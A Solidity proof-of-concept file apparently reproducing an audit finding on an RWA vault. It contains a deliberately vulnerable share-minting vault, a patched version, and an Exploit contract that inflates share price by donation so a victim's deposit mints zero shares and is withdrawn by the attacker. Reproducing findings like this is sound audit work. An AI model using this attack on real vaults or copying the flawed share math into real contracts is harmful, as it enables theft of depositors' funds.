// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum RWA Vault — H-18 (Pashov, 2025-05-06)
    The first depositor mints shares 1:1, then donates assets into the adapter.
    totalAssets jumps without new shares. The next deposit rounds
    deposited * supply / assets down to 0, and the attacker redeems the
    victim's tokens with the original 1 wei share.
*/

contract Token {
    string public symbol = "crvUSD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

error InvalidAddress();
error ZeroShares();

contract ShareToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == owner, "owner");
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        require(msg.sender == owner, "owner");
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

contract VaultAdapter {
    Token public token;
    address public vault;

    constructor(Token _token) {
        token = _token;
    }

    function setVault(address _vault) external {
        require(vault == address(0), "set");
        vault = _vault;
    }

    function deposit(bytes calldata data, address from) external returns (uint256) {
        require(msg.sender == vault, "vault");
        uint256 amount = abi.decode(data, (uint256));
        require(amount > 0, "amount");
        require(token.transferFrom(from, address(this), amount), "pull");
        return amount;
    }

    function send(address to, uint256 amount) external {
        require(msg.sender == vault, "vault");
        require(token.transfer(to, amount), "send");
    }

    function totalValue() external view returns (uint256) {
        return token.balanceOf(address(this));
    }
}

contract RwaVault {
    Token public asset;
    VaultAdapter public adapter;
    ShareToken public vaultToken;

    constructor(Token _asset, VaultAdapter _adapter) {
        asset = _asset;
        adapter = _adapter;
        vaultToken = new ShareToken();
    }

    function totalAssets() public view returns (uint256 totalValue) {
        totalValue = adapter.totalValue();
    }

    function _deposit(address, bytes calldata data, address receiver) internal returns (uint256 sharesMinted) {
        if (receiver == address(0)) revert InvalidAddress();
        uint256 assetsBefore = totalAssets();
        uint256 supplyBefore = vaultToken.totalSupply();
        uint256 depositedAssetValue = adapter.deposit(data, msg.sender);
        if (supplyBefore == 0 || assetsBefore == 0) {
            sharesMinted = depositedAssetValue;
        } else {
            // @> VULN: donated assets inflate assetsBefore, so this deposit rounds to zero shares and the first depositor can redeem it
            sharesMinted = (depositedAssetValue * supplyBefore) / assetsBefore;
        }
        vaultToken.mint(receiver, sharesMinted);
    }

    function deposit(bytes calldata data) external virtual returns (uint256) {
        return _deposit(address(adapter), data, msg.sender);
    }

    function withdraw(uint256 shares) external returns (uint256 out) {
        uint256 supply = vaultToken.totalSupply();
        uint256 assets = totalAssets();
        out = assets * shares / supply;
        vaultToken.burn(msg.sender, shares);
        adapter.send(msg.sender, out);
    }
}

contract RwaVaultFixed is RwaVault {
    constructor(Token _asset, VaultAdapter _adapter) RwaVault(_asset, _adapter) {}

    function deposit(bytes calldata data) external override returns (uint256 sharesMinted) {
        uint256 amount = abi.decode(data, (uint256));
        uint256 assetsBefore = totalAssets();
        uint256 supplyBefore = vaultToken.totalSupply();
        if (supplyBefore == 0 || assetsBefore == 0) {
            sharesMinted = amount;
        } else {
            sharesMinted = (amount * supplyBefore) / assetsBefore;
            if (sharesMinted == 0) revert ZeroShares();
        }
        adapter.deposit(data, msg.sender);
        vaultToken.mint(msg.sender, sharesMinted);
    }
}

contract Depositor {
    Token public token;

    constructor(Token _token) {
        token = _token;
    }

    function depositInto(RwaVault vault, uint256 amount) external {
        token.approve(address(vault.adapter()), amount);
        vault.deposit(abi.encode(amount));
    }
}

contract Exploit {
    uint256 public constant DONATION = 1_000_000 ether;
    uint256 public constant VICTIM_AMOUNT = 10_000 ether;

    Token public asset;
    VaultAdapter public adapter;
    RwaVault public vault;
    Depositor public victim;
    uint256 public stolen;
    uint256 public victimShares;

    constructor() {
        asset = new Token();
        adapter = new VaultAdapter(asset);
        vault = new RwaVault(asset, adapter);
        adapter.setVault(address(vault));
        victim = new Depositor(asset);
        asset.mint(address(this), DONATION + 1);
        asset.mint(address(victim), VICTIM_AMOUNT);
    }

    function run() external {
        uint256 startBal = asset.balanceOf(address(this));
        asset.approve(address(adapter), DONATION + 1);
        uint256 firstShares = vault.deposit(abi.encode(uint256(1)));
        require(firstShares == 1, "first shares");
        require(vault.vaultToken().totalSupply() == 1, "supply");

        require(asset.transfer(address(adapter), DONATION), "donate");
        require(vault.totalAssets() == DONATION + 1, "inflated");

        victim.depositInto(vault, VICTIM_AMOUNT);
        victimShares = vault.vaultToken().balanceOf(address(victim));
        require(victimShares == 0, "victim shares");
        require(vault.vaultToken().totalSupply() == 1, "supply unchanged");

        uint256 out = vault.withdraw(1);
        stolen = asset.balanceOf(address(this)) - startBal;
        require(out == DONATION + 1 + VICTIM_AMOUNT, "redeemed all");
        require(stolen == VICTIM_AMOUNT, "profit");
        require(asset.balanceOf(address(victim)) == 0, "victim drained");
        require(asset.balanceOf(address(adapter)) == 0, "adapter empty");
        require(vault.vaultToken().balanceOf(address(this)) == 0, "shares burned");
    }
}
